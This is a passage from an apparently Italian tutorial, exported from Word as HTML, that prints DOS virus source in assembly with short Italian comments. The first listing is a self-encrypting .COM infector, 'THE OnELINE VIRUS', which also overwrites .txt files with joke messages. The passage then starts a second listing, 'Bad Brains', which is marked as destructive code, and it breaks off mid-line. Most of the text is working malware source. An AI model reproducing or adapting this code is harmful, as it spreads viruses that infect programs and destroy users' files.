<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>mov
di,si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov cx,crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>call crypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>crypt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>xorloop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lodsb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>xor al,byte ptr[xor_value]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>loop xorloop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>xor_value db 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>; parte criptata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>crypt_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,mask<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp text<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>infect:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ax,3d02h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov dx,9eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov bx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; I suggest 'xchg bx,ax', because its only 1 byte, but
thats your decision<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ricava e salva chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>in al,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov byte ptr [xor_value],al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; cripta virus con il solito meccanismo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lea si,crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>lea di,end<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov cx,end - crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>call crypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive parte non criptata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov ah,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov cx,crypt_start - start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>lea dx,start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive parte criptata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov ah,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov cx,end - crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>lea dx,end<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,3eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp find_next<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_next:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,3fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp text<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,textmask<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc text_payload<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp close<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text_payload:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ax,3d02h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov dx,9eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov cx,message_end - message_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,message_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,3fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp text_findnext<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text_findnext:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc text_payload<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp close<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>message_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>db
'LEGALIZE CANNABUS!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>db
'HO HO HO.. </span></b><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>NOW I HAVE A MACHINE GUN!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'This is another 60 minutes...'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Burn Baby, BURN!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Keep The Opressor Opressing..'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Have U Had Your Break TodaY?'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Oh I Wish I Was A Ocsar Myer Wiener!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'What Came First The Chicken Or the Egg?'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Help Me.. Help You!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'SHOW ME THE MONEY!!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Take it Off Baby!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'ADRIAN!!!!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Where do You Want To Go Today?'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'We Are the Shitty VR! VRLAND SUX SHIT!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'INCOMING!!!!!!!! BOOOOOOOOOMMMMMM!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>message_end:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>close:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 20h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mask db '*.com',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>textmask db '*.txt',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>author db ' ARSONIC [CODEBREaKERS]',13,10,'$'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>virus db 'THE OnELINE VIRUS',13,10,'$'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>origin db 'PROUDLY MADE IN CANADA..',13,10,'$'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>end:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:red;mso-ansi-language:EN-US'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_4._Virus_Bbrains:"></a><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:red'>4. Virus Bbrains:<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>funzionamento simile ai precedenti, con qualche
variazione strutturale, riguardo ad esempio al conteggiodei bytes da
crittografare.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; HR Virus Strain B-Compacted<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; Bad Brains<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; Created 8/5/91 by Hellraiser<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>; Destructive Code - Beware!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>fileattr<span style="mso-spacerun: yes">  
</span>EQU<span style="mso-spacerun: yes">      </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>filetime<span style="mso-spacerun: yes">  
</span>EQU<span style="mso-spacerun: yes">      </span>22<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>filedate<span style="mso-spacerun: yes">  
</span>EQU<span style="mso-spacerun: yes">      </span>24<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>filename<span style="mso-spacerun: yes">  
</span>EQU<span style="mso-spacerun: yes">      </span>30<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>virus_size EQU<span style="mso-spacerun: yes">     
</span>554<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; parte non criptata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>code_start EQU<span style="mso-spacerun: yes">      </span>0100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'>code<span style="mso-spacerun: yes">    
</span>segment<span style="mso-spacerun: yes">  </span>'code'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'>assume<span style="mso-spacerun: yes">  
</span>cs:code,ds:code,es:code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'><span style="mso-spacerun: yes">        
</span></span></b><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>org<span style="mso-spacerun: yes">     
</span>code_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>main proc<span style="mso-spacerun:
yes">   </span>near<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>jmp<span style="mso-spacerun: yes">   
</span>virus_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>encrypt_val<span style="mso-spacerun:
yes">    </span>dw<span style="mso-spacerun: yes">     </span>0000h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>virus_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">     </span>call<span
style="mso-spacerun: yes">     </span>encrypt<span style="mso-spacerun:
yes">                  </span>; critta / decritta il codice<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">  </span>jmp<span style="mso-spacerun: yes">     
</span>virus<span style="mso-spacerun: yes">                    </span>; vai
all’inizio del codice<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; routine di crittazione: misura in byte presi dalla fine,
quindi decrementa il contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
